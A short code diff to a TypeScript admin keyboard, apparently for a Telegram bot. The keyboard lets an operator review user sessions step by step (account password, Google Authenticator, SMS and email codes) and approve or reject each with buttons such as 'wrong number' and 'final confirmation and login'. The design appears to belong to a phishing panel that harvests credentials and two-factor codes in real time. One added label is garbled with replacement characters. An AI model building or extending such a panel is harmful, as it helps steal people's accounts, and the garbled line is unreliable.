@@ -889,7 +889,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong SMS button - always available (moved from wrong buttons section)
   buttons.push([
     {
-      text: "❌ شماره اشتبا�� است",
+      text: "❌ شماره اشتباه است",
       callback_data: `incorrect_sms_${sessionId}`,
     },
   ]);
@@ -943,7 +943,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   if (session.completedSteps.length > 1) {
     buttons.push([
       {
-        text: "✅ تکمیل احراز هویت",
+        text: "✅ تایید نهایی و ورود",
         callback_data: `complete_auth_${sessionId}`,
       },
     ]);
@@ -1222,7 +1222,7 @@ const getStepDisplayName = (stepType: string): string => {
   const names: { [key: string]: string } = {
     password: "🔒 رمز عبور حساب",
     google: "📱 Google Authenticator",
-    sms: "💬 کد تایید پیامکی",
+    sms: "💬 کد ��ایید پیامکی",
     email: "📧 کد تایید ایمیلی",
   };
 
